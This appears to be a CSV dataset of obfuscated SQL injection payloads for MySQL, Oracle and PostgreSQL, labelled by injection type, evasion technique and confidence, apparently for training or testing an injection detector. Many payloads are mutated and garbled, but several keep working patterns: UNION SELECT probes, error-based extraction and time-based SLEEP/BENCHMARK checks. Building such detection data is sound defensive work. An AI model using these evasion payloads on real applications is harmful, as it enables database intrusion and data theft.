payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"8B0o1 )'[ `) Or fALSE aND TRUe) && TRuE or FAlSE aND (SeLEcT (SELEct (SelEcT (SELECT 1)))) aNd (SeLECT 1) anD 0X1 or FAlsE aNd tRUe OR falSE#<aS juOE WHerE=(sELECT (sELeCT 8x0X0x10Ea)) Like 0x250A OR /*MWhc9:(SeLEcT (SeLEct (SelEcT (SEleCT (sEleCT 0X2)))))m 4L0o7KId t**/0X0O135F_LikE ( sElECT CoUnt (: * >)| FRoM rdB$fIELDS aS t1,rdb$TYpES as T0b10,RdB$COlLaTIONS AS t0X7B12,rdB$fUNCTIonS.AS t4~ ) AnD TRUe;--Udq-jJ<",unknown,unknown,case_variation|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1B1 ). or ELT* ( }(SElect 0o14130) LIkE (sELEct (SEleCt (SELECT 0x189e))),sLeEp ( (sELecT 0X4) ^?) /**/ )",unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,unknown
"1' ;) ) ) anD/*|:(selECt (SElECt (SELeCt (seLEct 0X4))))E6gTozL;w9=fZdei)j42*/0o0x0o0O7xeaA LIKE (<|sELeCt uPPEr ( XMLtyPE: ( Chr ( (sEleCt (SeLecT (seLeCT 8x3c))){ ) ||CHr ( 6x7o3a ) oR cHR ( }(SELECT (SelEcT 0x71))[ )"", Or cHR ( ~(sELECt 0X0X71) *) Or Chr_ ( +(seLecT 0xB0o6) ) ||cHr ( 0o247 ) oR CHR ( (sELeCt=(sELeCT (sElEcT (sElECt 0b1101110)))) ) :|| (* sElECT/**/, ( CAsE wHen ( 0xf17=0XeaA ?) thEN 0X2 ELSe (SEleCT 8b0) EnD! ) fROM^DUAl ) OR chr ]( ~(SELeCt 0b101B7x0x10eFF2) ) ||chR _( \0O0X0o0xfA ) ||CHr ( (SelECT 5XD2) ) ||CHr ( (SElecT](sELEcT 0xDE)) ) ||CHR ( (SelecT (sElect (seLecT (SEleCT (SelecT (SELEct (SELeCT (SEleCt 116)))))))) ) ||chR ({ 9x7x0B11e \) ) ) ) fRoM~DuaL_ ) AND ( ]( / (` 'JzPB' LIKe `'jZPB",unknown,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
"1'+ (: sElecT pXsD&wHEre>0Xa10 lIke (seLecT (SElECT (sElECT>(sElECt{0xa10))))-or updatEXmL ( [2B1101051011050,coNCAT \( 0X2e,0x0B11011010110111010101100a21, ((;SEleCt < ( eLt ( 0X0o0x710 LIKe? (seLecT 1X710),(selECT (seLeCT 0x0O0x0b1)) ) ) :) :,0x717a787A71{') ,0o20732 /**/ )/ .)_ +'",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"1"" ) or 0b10000000010010 =/**/ bEnchMaRK ( 0x4c4b40,mD5@ ( 0x194A0O0o0b0b10010010111111011001001000100000111110110011 ) ) and ( ""ubvD"" likE ""UbVd",time_blind,mysql,comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"SELEct COUnT/**//*jXv&f> &0X7*/( jvK X*/ ) | FRoM/**/GENERaTE_SeRieS [( 0B1,0x4cC7o116 ):/**//**/AND. ( -(Select 0b0o21075)=0O0b0b10011011101110001011110011100111111001000101",unknown,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
"0B1,?!(>^case~WHen%4x8B2x0x0b11110111dc}~LikE< 0X0X0x0B0X0xC18-tHen (SelECt?0O0X2O0O1) else NUll.enD )>",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"1 ) AND eLt ( {0x203a{/**/ LIKe !%(sElect 0b0B1001010100101001100010110000100010),SleEp (. 0o5 )/*:,z */ )",unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,unknown
"seLect dBMS_PIPE.rEcEiVE_messAGE ( ChR ( 4x42 ) OR Chr ( 0x0b0o327025/*N*/ ) Or chR ( (seLECt (SelECt (SeleCt (SELeCT (SELecT (sElecT (selecT 0X4F))))))) ) or, $CHR -( (SeLECt 0x329)/**/') ,(sElEcT 0X5) ) fROM DuAl aNd ( > .( 0x1C48 =[ 0o0X0O0o1C48",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"9B0X0o2%"" ) ] Or rOW ( (SElECT (sELect (sElECt (selEcT (SELECT (SELECT (SELECT 1075))))))),(seLeCt 0x1D8A)? ) > ( selECT CouNT ( * ) ~,CoNCat ( 0x0o33260252A71, ( SElecT {( ELT (; 0O2023 LIKE[(SelECt 0X415),0X4 ) !)_: ) ,1X717a767A51,fLO $OR ( rand ( 2X0 ) *(sELEcT 0x0x1), ))^ ) x FROM ( seLEct 0x2128 UNion SeLect<0O0X31aA UNioN Select\0xBeb Union{select 0X4Ba )( a GROuP By,x ) aND_ (/*}ii`/*/ ""%"" lIke """,union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"1 +) /ANd eLt;]( }0b2B0x0o3X0o0O0o1242==/*`Yu*/0x6O7063,(selECT+(SeleCt-0x1d55)) ) aND<<:(+&(SeLEcT]0b0O20032)=8226",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"9B4B1"" wHeRE'5157 =; 0x0o26FC ANd 0b0B0x51Db03Af2e6A= ( selEct_coUNt (.`O* /**/) FROm DOmain.DOMaiNs as%T0b1,DOMAin.coLUMnS AS%t2,Domain.tablES As]t3 ?) Or (seLECt (SELEcT_(SELECt%(seLeCT (SElECT (sELecT (SElEct (SELEct (SElecT (SELECT 9273)))))))))) LiKE/t*/\y^y*/0x0X802 ^AND .TrUE && TrUE OR (SelEct (SELEcT (SelEct (Select (SElecT 0X0))))) aND ';*s' lIKe ';*S'""--",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_double_quote
"SELeCT * frOM GENeratE_serieS ( (SELECT 9864),(SeLecT (selECT (SELECT (SELECT 9363)))),CASe WHEn ( *(SeLEcT 0x23ba)/**/ LIKe ` 0x0b0Xd05 ) THeN (sELECT 0x1)@eLsE 0 EnD ) Limit 0x1--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"7X1O7b3' oR _&(`~SElECt)'yaIi' fROM`dUAl!WHerE~0o0B0O0x5c0O0X0O110@=/0x0B101B3C11\union-All/*j!t{t?f0b1109wZ*/seLECT nUll,nuLL,NulL,nULl,NUll,NULl,Null,nULl,NUlL$aNd tRue ?and trUe Or$(seLecT 0X9X0) oR=(sELECT>(SelEcT (seleCt 0X0))) OR fAlsE anD{tRUE* OR (sElECT 8x0) Or falsE OR\fALSe OR ""G""=""Ga"" OR False#auYcv@&sP+';Bd;;",union_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,string_double_quote
3' ) whERE 0B1001101010101 =\ 0x0b10101001011,unknown,unknown,hex_string,0.0,rule,sqliv5_json,unknown
"0"" and (SEleCT 0X9x0o21a3) = cTXsYs.dRIThSX.sN (% 0X17Ab, ( chR *(/\(SELECt (SeLeCT 0x0O107))[~)^ANd (SELect 0x21c0o6) NoT LikE (SeLeCt 1X21C7)&OR FaLsE aND 'O' NoT Like 'oq' OR FALse anD 6x1 OR False# oR chr ( ,0X0x92{ ) || CHR ( (SeLeCT (SelecT 0X9x42)) ) or Chr ( 0x6A ) or chR) ( (sELECt (SeLEct 0x78)) )||(; SELeCt ( case WheN ( 0b1X17a8 LIke 0X17a7 ) tHEN 0O0X1 ELsE (SeLecT 0B0x0) eND ) fRoM dUAL ) oR chr? ( 0b0x75/*Th5P)k*/ ) oR Chr ( 0x0x0b151a ) oR chr ( 0X0x2e ) OR chr ( 1b1111010@ ) OR chR ( (SelecT (SeleCT (SeleCT (SeleCT (SELect (seLecT (SElecT (SElECT (sElECt (seLeCt (sELEcT (SEleCt (SELECT (SELECT (SELECT 113))))))))))))))) .) ) !)? R+n gXmT-P{/",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.51,rule,sqliv5_json,string_single_quote
"0O9X0B4x6B0o0X5b8X0O3o0o4b0o1x3B6o0o0O0X0B8o7o8x1X5x3X4b110o0o3B0o0x0b10%""^uNION]aLL,SelEcT~NUll,nuLL,nULl--",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"1' ) ` && eXp ( ]~ ( SeLECT * FRoM ( SelEcT conCaT ( 0x8o0X1fB9dE4A91, ( SelEct ? ( ELt ( 0o2X1ffE ; lIke (sELect (SEleCT?8x0x0b1fFE)),0x1 ; ) )% ) ,0b10X17a7x0b10fFa0X5b,0x0O6O0X7x4A , ) ) X ) ) [",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"0B1"" ) )` .or ChAR (# (SELeCT 0O0x7x0O4B) ) or cHAR (% (SElECt (sEleCT (seleCt (sELecT (selECT (SELecT (SELECT (SELECT (SELECT 70))))))))) ^)( Or chaR ( (SeLect (sELeCT?6X63))_ ) (& OR chaR ( 4O0b10X8B ) lIKE rEGexP_subsTrING !(/*s.xWB&(SelECT (SelecT 0X8))XY*/ rEpeAT ( LEFt ( crypT_KEy ( cHaR ( 0x0X0O7B901003< )[ OR cHar] ( (sELecT 0x05) ) or ChAr %( (SeLECT 0O153) ) ,NulL )) ,(SElECt (selECT!0X0X0)) ) ',0X0B0x53a31bc4d8c47f07a73489 ) ,NUll ) And 'r<u' not LIKe 'r<U2' or 0X0O154=(SELECT\(SEleCt (SeLECt 0o1005))) Or FALse or ""B"" nOt LIkE ""B"" && (SeleCt (SelEct 0x3eD)) not Like 0X0o6Ec || fAlse --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1%"" ) ANd 0o10442=utL_INAdDR.GEt_hOST_addreSS ""( cHR (] 0o191; )?, OR cHR `(, (sELect (seLECt (SElecT (SeLeCT (SELeCT (SElECT (SElecT (Select (selEct (sELEcT (selECt (selEcT (SeleCT 0X71)))))))))))))^ ) or (cHR !(& 0B0x90 ^) oR ChR ( 0X6A )/ |Or[ CHR (; 1X0B0x0O3O0X0b0x0X4F^ ) or ( seLEct ( case when ( .0O0X6152^= 0x0B0x1122 ) *TheN (SELECT 6x1) elsE 3x0X0x8x0 enD )< FroM dUAl ) || Chr+:( 0o0o141 ?) OR CHR (/*(SElECT (sElECt (seLECT (SeLect 04))))Q%.^eGa*/ (sELecT (sELEcT 0X4O7a)) &)/ Or cHr [(. (sEleCt+0B0X0xb5) ) ` OR chr `( /(SelecT (SeleCt 0x87)) ) OR cHr ($ 5b0O0x9xaf5x0x0o0b5B1213a : )/*U7~ AA:|MdnUSI|] }R43OalyocogrM*/ |) &>And}: (>,""%""< =~ """,unknown,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.11,rule,sqliv5_json,unknown
"1"" WheRe 0XBad == anD TRUE or faLse oR (sElecT 2742) Not liKe 0xab6 or FalsE or fALSe OR False# 0xbAd Or 0x20e5 lIkE !( sELEct CoUnT ( ;* ) froM GEneRate_SErIes ( 1O0b1,0X4c0o4B10 ) ) && (selECT (SeLEcT 0)) --a$w;{",heavy_query,postgresql,case_variation|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1"" ) /*;;5_W1iMVB9HY1[*/ ) ) anD RoW ( (sELECt (SELect 8O5xdB)),(sELeCt 0X1C5f) ) > ( SeLeCt cOUnT *( * && (SELECT 1) Or FALse and TRUe or fAlse#) ,CoNCAt ( 0o0x7171706a71, ( seLeCt ( elT? ( ""0{(""@likE ""4{("",0x1 ) ) ) ,0x718a267a71,FlOor ( Rand- ( (sELECt (Select (sELECT (SelEcT 0x0)))); ) *(SelecT 2) ) ) X FRoM ( sELeCT (SelECt (SEleCt 0X0B0O704)) UnioN SeleCt (SELeCT 0b194016001001) unION SELeCT 0O0xf5b Union SElEcT 0X1Bf6 ) a GRoUP;BY x ) anD !( ( ( ""SuXH"" LIKe ""sUXHANTg69o",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"8 AND{ ( SelECt 0X0x2* ( iF ( <(; SELeCT *~fRoM ( _selEcT COnCAt &( 0X7121706A71, ( SElEct~ ( ELT ( (SElEcT 1xD0b2001c) = 0b110110011100,0x0o1 ) ) ) ,0x717A767A74,0x78| ) ) ? S ) :, 1x7538DCfB7610FFFA, (SELect 8x7438DcfB0o1371e18Ea) ) ) +) and`(seLecT 0XD58) nOt like (SelEct (SeLECT (seleCt (SeLeCt 0xd5a)))) or 'W?2i'<>'W?2I'>OR false oR fALsE And TruE Or 0x778 <> (SELECT (SELECT (SELECT (SELECT 1912)))) AND True#[COUJ*lp",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,numeric
"7%''AnD mAkE_seT&<( ;0o0b0X0b101X9B3015D0X0b11\&=^>3B10x0x0B0B11201Ff,0x5X0X8x3b0b100001011111110Bf %))[/*:F C!*/AnD%'%'='",unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"7o0B1b1011'$or (;(~ SELECT 'HDpI' WHerE*(seLecT'0X6x15F4))= (sElect 2X0o17f4)%aND'MaKE_set!.($ 0b0O12431{ LIKe& 0B0X0X151B,0X0x3ebc$ [) )/*o$Ph And ~0xdB9 nOT=LIkE (seLEct`(select (selECT 0X0x11a0)))*or faLSe"" || ~FALSE Or#0x8 AnD TRUE-AND TRue ANd TruE oR false oR (Select (SeLECT (selECt (SELECT (SELECT 0)))))#*Lyf>F\(SEleCt (SELECT 5))!0x0 ^*/) -% or>'Caix`X,H",unknown,unknown,case_variation|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1' OR > *0x0o0O4340 lIKe bENcHmark (\ (seLeCT 0x4c4B40),Md0x5 ~( 0b101X0B0b111100001101010000111010011110A0b1007010901001 )_> {)+/**/",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,string_single_quote
"0O2o1' )+ =WhERe@0x0X0o20F0o0O44 |= ;(SeLECt 0x0b20010FB)_]OR <(SELeCT 0o2o0O7X20Db)=;+( sElEcT CoUnt (} * :)* fRoM SYSuSErS[as syS6,sYSusERs As SyS9,sYsUseRs$AS SYS0O1o3,sysUseRS'as sys0,sySUSeRS~aS""SYS7,sysUSeRs.AS syS6X0X0b640,sYsUsERs aS\Sys0O0o0B0B181/*I*H,;9DR/ 0B101NH,NP$qlT%gPe^)e]^L (SElEcT!(SElecT (Select[(seleCt (sELect 0x9)))))GNT %fWJN(B`CTW:*/ ); ?oR }FaLsE}<oR FaLSeandTRuE OR faLse AND (sEleCT;(seleCT 7X0b0O1))""ANd~""Y"" LIke ""y"" OR/FALSe%--",unknown,unknown,case_variation|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1'!WHeRE (seLect 0xD0b0b) LikE~ (seLeCt*5o0xD0b)/**/and 3824. like \bEnChMaRk_ ( (SeLeCt 0O0X4C4b40),Md5 &&6252=0X186c#( 0x0B0x0B0B101001011001101000001010100101101010111010101010110010111100110100111101000001000101010 ) ) anD ' '=' '[aNd tRUE AND{tRUE oR 0X0x0 or 'o!7'!='O!7'/**/ Or 0x0 --:;J",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"EnD aNd /*fO)}4-!!0xD*/+/**/( %Or}0b100001110010=nOT>In/**/(0x0b800001110001,0b1b0b1011101001000100001111101011111111111,0O4164). && 1#/(~*{ /**/( [""rEVX"" &=. ""RevXs1",unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"6O0b0b115X0x6X0O4b0x0B110x7X0o0x0o0B0O1155%'/*E>RK0B111Eb*_$0B1O6X0B0x0B0O1!UaO&=} wY4o7 oK?'Pbi%^sZYnP1]NCIz2*/unIoN\All seLECT>Null,Null,nUlL,NUll--",union_based,unknown,case_variation|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"5X0x9B0X1%' oR / cHaR_}( AnD TrUE or fALSE or fAlse#(sEleCT 0x331)* ) or cHar, (< 0x0B0B1fa! ) oR chAr ( (seLeCT (seLEcT (sElEct (sELecT (sElECt 0x59))))) -) OR cHAr ( /*@rQpb9^HRlCNo<; xf**/0X1a0O5; ) LikE ReGEXP_sUBsTrinG? ( }repeAT{ ( <RiGHT&%( ChAr: ( 0X0b0o5a8 ) ,0O0x0O0o0o0x2 ) -,(SelecT 5x34C9e26aF) ) ,NUll #)@ && _tRUE anD (SEleCt<8b105018701)<>0X0O564]AND.(SeLeCt (selecT (Select 1))) or+False && 0x5X0b1<ANd 0x24F5 Not=0X24f6 oR FALse --uhpt",unknown,unknown,case_variation|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"7B0b1571011o7o0x1b0b0X0b11X0b178O0X0O4%' , ){} )=, $rlIKe SleEp.[(@/*4waxPBI0B100<V<|3A<soN;0X3]@`*/6o0x5O2B6B0X3B0X4x0o5B0X6 $); /<? `aND*{/*Ak*]~(SElecT 24)|_n^_zM)*/^< ( /**/[#(=?<'%'` Like_)'",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1' %?) ]; ):=:'As bsvk whERE (selEct (seleCT (seLECt (seLECt (SELECT (SELECT 5985))))))]liKE 0o13541/*~/O*/And eXtractvaLuE ( ](seLecT (seLecT (SELEct 0b1111100101110))),CONCat ( 0b4b0X0x0O0O5c,0X8771506A41, /**/( }SeleCt= ( elT (/ g9""i*/-Cp;.*t8K*/ 0X1f2e> Like 0B0b0B10000001010110011010100101010100001110110,0O6x1 ) ) ) ,0X717A0B0b111100010001010011111100100111a77 @/) * )| + && *(SeLECt (SelecT.(SeleCt 0b0x1))) or FalsE anD (seLEcT 0x2604) LIke](seLECT (SELeCt (seLEct (seLECt 0x2604)))){--",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"1 + )]. ) aNd 0o0X30D7 (LIkE ( SeleCT COunt ;( * !) from GenerAtE_SERIEs ( (SELEcT 3x1),0X4c4B0o0O2O0O0O40/ ) ) ANd ;(/*f (sELecT (SELECT (SELECT 4)))C*/ }( 0x1787 lIKE 4357",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1"" WHeRe (SELeCT 0x9x0b1110e0B1001) likE (SELEcT 0B1010411141031)(ANd exp ( ~ >( SELEcT * FrOm (~ SeleCT coNcat ( 0x7171706a71, ( Select ;( ELt ( 0x1Ffe>= 0x88E,(SelECT (SelECT (selECT (SelecT (sElecT (SElect (SELECT (SELECT (SELECT (SELECT 6)))))))))) ) ) ) ,0x717a0x2ffa0B1400111,0X58 /) \) x ) /*Tm}.*/) oR ""LI"" NoT 'liKe '""li""< Or falsE/**/ && TRue OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"CALl regeXP_SubSTriNG ( REPEAt ( LeFt ( CrYPT_Key ( %cHAR ( (SeLEcT (SELECT (SELECT 68))) ) OR}CHAR [("" (SELECT (SELECT 71)) ) ; || cHAr ( 2O123 ) ,nulL ) ,(SELECT (SELECT 0)) ) ,3X0b0b0x2774c20580 ) ,null^:) anD (/*?C`O*/ ( )( 'gtcb'`= 'gTcB",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1' .) ) aS lIzu WherE 1X1E2b=0o0b106001502110101 or cHAr [( &(seLeCT (sELEcT 0X8O23)) <) Or cHaR ( (selEct*0x0X0X0X0B0XaE) ) OR cHAr/* @lQ+*/ ( ;(seleCT (SeleCt;0o0x62))? ) oR ChAR_ ( (sElecT (SELeCt (seLEct=0X53))) ) lIke/ REGEXP_SubsTRing ( repEaT ( leFt ( cRYPt_kEy ""( char: ( (select (selEct (SELECT 61)))^ )? or char ( (SeLeCT.(SElEct (selECT (seLecT (SElEct 0x59))))){%) Or cHaR] ( \(SeLecT (SelecT~0x53)) )/**/@,NulL ) ,0O9 ) ,0O0b0x23dE9F7b8c468FE7803e6DA6 ) ,nULl ) , or 'u(V' liKE :'U(Vr' anD tRUe oR FalsE or '%mFk' = '%mfkl' or falSE ANd TRUe Or (SELECT 0) or fALSE Or 'F<'='f<i' --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_single_quote
"0',/*cd3\7G?*/ ( sElect ( CaSE$WHen ( (SELeCT (SELEct (selECt 8382))) LIKE 0x20A0> ) tHEn 8x1 eLSE (SeleCT (select (SeleCt 1)))/ ( }SelecT 0 )/*6qg P8*/ END} ) )",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0o1 ) Or ( sEleCt (sElect (SELECT 9173))=FrOM ( SElEct.COunt ( * ) ,coNCAt ( 0X6x6171706A71, ( /selECt ( elT ( 9178 LIKe (SELeCt (selecT 9373)),(sElECt (SeleCT 8)) /*(fO`9{w*/) ) ) ,0X0b0x2cDA767a0O107,FLO Or ]( ranD !( (selEcT (SELEct (SelecT 0))) ) *(SeLecT 2) > ) )~ x FRom INfOrmATiON_ScHEMa.cHARacTer_sEtS Group By x ) -A )>",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1' ) ) As^hXxM~WheRe 0B111011010000 ~LIKE/**/ 0xeD0O6 And^sleep>@( /*|WIyoGl:|Zl{Qz */(SELect 0o0B101) |) Or FalSe Or?0X0b11111051e nOt LIkE 0O0x217e or (seleCt+(SeLEcT`(SelEcT 6X12d1)))=(sELECT (selECT=(sElEcT 8x12d2)))+Or<""u""<>""U"" OR fALse-oR]""w""<>""W"" oR FAlSe or faLse]&& TruE && TrUe And true And trUe OR False#[ho}}v",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,string_double_quote
"8O2 ) ?Or &(sELecT (SeLECT`0X9x0x0o0x542))= ({]sELECt cOUnT[`( * ) *FroM SYSUsErs As Sys1,SySuSerS As syS1X3,sYSusErS:AS Sys0X3,SySuserS]As;SYs0x4,SYSuSErs+As,Sys0B091,sYsUserS AS:sys6O0,SYsuSERs[As Sys0b10 ^or( (SeLeCT (select (SEleCt (SElect (SeLect+(seLeCt`0b0x17591EC0Ca)))))) not lIKe~0O6B700511010110 OR ""$0""?NOt lIKE ""$0"" Or false aNd ""bJ "" nOT Like ""bJ r"" oR fAlse""aND TRue aNd (SELECT 1) && true ANd (sEleCT (SELECT 204))!=0Xcd oR faLse oR FaLSE#)/*e'<oTl;+cZR_|8mp~Jh>[RlF4x=lU0F}iYZ*/ --;>*vAQA{h+KChj0",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"iIF}!( 0x415a+=[0b1110011110100,(SELECT 1),(SELECT 0x1)/0x0b0x0 *)*%",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"0X0'; ), :)? \ ) )ANd-MakE_sEt ( 0x23D3 = 5O0O6XB9b0x0O7,(SELeCT (sELeCT (SELeCt (sElECt (SEleCt,(selEct (sELECT[(SELeCT (sELEcT (sELECT (SELECT 6819))))))))))) /) && @( ( ?{@(( :'OAcz'->={ 'OacZ",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"1'+: (/* OR 1597 NOT LIKE 1597#*/ sElect MEmS Where (sElECT?1b6X13e0O4) like (sELEct 0X13E3) && ;EXtractVALUe ( 0x9F2E,coNCAT ( && 0b6 && tRuE and<9X1 or fAlse OR (SELECT (SELECT 0)) OR False OR False#0B0x3C,0x4172706A0x47, () SelEct ( eLT( (; 0O0x1f2e LIKe* (SeleCt 0x1f6e),(SeLeCt$(SeLeCt 0X1)) : )/**/ ) ) ,0x0o1315a0B1614110108a34 ; ) ) ) +'o,drpe `2",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"1 oR ( SeLEct 9173 fROm ( SeLECt cOuNT (' * ) ,CoNCat ( 0X7571706A71, ( SelEcT ( elt ( 0B10001111010101=(seLECT 1x0o27D5),(SeLECT (sELeCT (SeleCT (selecT (SELECT 1))))) { ) ) ) ,0x517A467A0x0x47,FLO OR ! ( rAnd ( (SEleCt (SeLECT 0x6))~ ) *(sEleCt (SELECT 2)) ) ) x FrOM INForMatiON_SCheMA.CHArAcTEr_SeTS gROup$bY x ) A ) aNd/**/'}' NOt lIKe '}g' Or FaLsE aND true oR 0O20755 NOT lIkE 0X21ed and tRue aND (sElECt 1468) NOT LiKe (sELECt 0o0x5A9) aNd TrUE or falSe# CqqsS (2wE",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"2'+ ( sElECT 'oTqY' whEre>7Xac0 LIkE (SEleCt (SELEct 0xa90)) or~UpDATEXML ( (seLect (seLeCT (sEleCt (seLect (sElECT (sELeCT (SELECT (SELECT (SELECT 1808))))))))),coNcat ( 0X0o0o2e,0x7771706A71, (~ seleCt ([ elT ( (SElECt 0O4x0O1306) LIkE 0X410,5x1 | ) )< ) ,0x0X2cda0x2ffA71 ) ,0X11da ) ) %+'",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv5_json,unknown
"2` ) <: )} ? AnD; ; )extraCTValUE <(^ (SElECT 3X1f2e),conCAt ( }0o0X0b0b101C,0x1171706a71,* ( SelECT-? ( eLt ( 0x0O9f0o43 LiKe \(SELeCt 0B1111100101310),(selECt 0x1) @ ) ) /*Fp;*/ ) ,0X417a0O0x0B161Ffa11 ; )_ :)- aND .(} ( 0B0o7B111010151013 lIKe 3622",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0O5'~And/**/uPdatexml<)( :(seLeCT`0b0xd47),concAt (%}0O0O0B0x0X2e,0X0o33267176a71,]_($ SElEct (+ Elt (~ 0B0XD0B101041 =liKe> 0b0b1100110100110101010101110100101010111,(sELeCT/*;(sELecT/*GR8+P$5*/0x8)]e*/0o0x0X3b1) )? :) _) ,0x0O7x0X819A0O0x0B100101101a0O105{ )< ,0O0o12133$ ) . aNd/**/`'QCSi'='qcSi",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0X1 ;)} ) anD ( sElEct (sELECT (SELEcT (selECT (seLEct 0O0X5))))* ( IF; ( ( /*t?}QLu \=I2JGiX*/Select * FrOm (> SElEct CoNcAt ^( 5x1171706A71, ( seLect~ ( elt! ( (SElect 2Xd9c) lIke 0xD9C,(SelecT (sELECt (SeLECt 0x8))) !) ) ^) ,0X0X717A0O103a0o107,0x78 ) ) S ) , 0X7538DCfb5617FFfA, (sEleCt 0x7538DcFB9617FFfA) )& ) ) && ( ( 0x1355 lIke ` 5716",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
